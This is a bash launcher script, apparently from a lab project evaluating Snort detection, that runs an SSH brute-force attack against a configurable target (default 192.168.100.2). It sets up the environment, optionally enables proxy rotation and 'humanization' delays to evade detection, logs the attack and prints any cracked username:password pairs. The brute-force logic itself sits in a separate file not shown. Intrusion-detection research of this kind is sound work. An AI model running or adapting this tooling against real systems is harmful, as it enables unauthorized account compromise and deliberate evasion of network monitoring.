#!/bin/bash
# Run Enhanced SSH Brute Force Attack
# Complete automation script for research purposes

echo "Enhanced SSH Brute Force Attack - Research Tool"
echo "=============================================="
echo "WARNING: For educational and authorized testing only!"
echo ""

# Change to script directory
cd "$(dirname "$0")"

# Check if virtual environment exists
if [ ! -d "venv" ]; then
    echo "Virtual environment not found. Setting up..."
    ./setup_environment.sh
    
    if [ $? -ne 0 ]; then
        echo "Failed to setup environment. Exiting."
        exit 1
    fi
fi

# Activate virtual environment
source venv/bin/activate

# Check if humanizer and proxy modules are available
HUMANIZER_PATH="/home/labctrl/Documents/snor/agenteAtaqueFuerzaBruta/ScriptMejroados"
if [ ! -f "$HUMANIZER_PATH/humanizer.py" ]; then
    echo "Warning: humanizer.py not found at $HUMANIZER_PATH"
    echo "Attack will run in basic mode without humanization"
fi

if [ ! -f "$HUMANIZER_PATH/proxi.py" ]; then
    echo "Warning: proxi.py not found at $HUMANIZER_PATH"
    echo "Attack will run without proxy rotation"
fi

# Configuration
TARGET_IP=${1:-"192.168.100.2"}
TARGET_PORT=${2:-"22"}
MAX_ATTEMPTS=${3:-"50"}

echo "Configuration:"
echo "  Target IP: $TARGET_IP"
echo "  Target Port: $TARGET_PORT"
echo "  Max Attempts: $MAX_ATTEMPTS"
echo ""

# Confirm execution
read -p "Proceed with attack? (y/N): " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo "Attack cancelled."
    exit 0
fi

# Create logs directory
mkdir -p attack_logs

# Record attack start
echo "$(date): Starting enhanced SSH attack against $TARGET_IP:$TARGET_PORT" >> attack_logs/attack_history.log

# Run the enhanced attack
echo "Starting enhanced SSH brute force attack..."
python3 enhanced_bruteforce_ssh.py

# Check if attack completed successfully
if [ $? -eq 0 ]; then
    echo ""
    echo "Attack completed successfully!"
    echo "Check attack_logs/ directory for detailed results"
    
    # Display latest log files
    echo ""
    echo "Generated log files:"
    ls -la attack_logs/ssh_attack_* | tail -5
    
    # Display summary if results file exists
    LATEST_RESULTS=$(ls -t attack_logs/ssh_attack_results_*.json 2>/dev/null | head -1)
    if [ -f "$LATEST_RESULTS" ]; then
        echo ""
        echo "Attack Summary:"
        echo "=============="
        python3 -c "
import json
with open('$LATEST_RESULTS', 'r') as f:
    data = json.load(f)
    stats = data['attack_statistics']
    metrics = data['effectiveness_metrics']
    
    print(f'Total Attempts: {stats[\"total_attempts\"]}')
    print(f'Successful Logins: {stats[\"successful_logins\"]}')
    print(f'Success Rate: {metrics[\"success_rate\"]:.2f}%')
    print(f'Proxy Rotations: {stats[\"proxy_rotations\"]}')
    print(f'Humanization Delays: {stats[\"humanization_delays\"]}')
    
    if data['successful_logins']:
        print('\\nSuccessful Credentials:')
        for login in data['successful_logins']:
            print(f'  - {login[\"username\"]}:{login[\"password\"]}')
"
    fi
    
    echo ""
    echo "Next steps for research analysis:"
    echo "1. Check Snort logs for detection alerts"
    echo "2. Analyze timing patterns in detailed logs"
    echo "3. Compare with baseline attack patterns"
    echo "4. Document evasion effectiveness"
    
else
    echo "Attack failed or was interrupted"
    echo "Check attack_logs/ for error details"
fi

# Record attack end
echo "$(date): Enhanced SSH attack completed" >> attack_logs/attack_history.log

# Deactivate virtual environment
deactivate

echo ""
echo "Enhanced SSH attack session completed."